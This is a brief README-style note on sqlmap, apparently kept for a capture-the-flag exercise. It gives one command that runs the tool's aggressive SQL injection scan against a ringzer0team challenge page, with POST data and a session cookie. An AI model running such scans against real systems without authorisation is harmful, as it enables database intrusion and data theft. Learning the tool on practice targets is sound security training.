SQLMAP
=====

Sqlmap is a tool to find sql injection in a form.

Usage
-----
Here is a basic usage for a POST sql injection with sqlmap. this will show every payload with sql injection.

```
python2.7 sqlmap.py --data="username=user&password=pass" -u "https://ringzer0team.com/challenges/124" --cookie="PHPSESSID=1qjrh7gek3p4ro09rorq8app46" --technique=E --level=5 --risk=3 -v 3
```
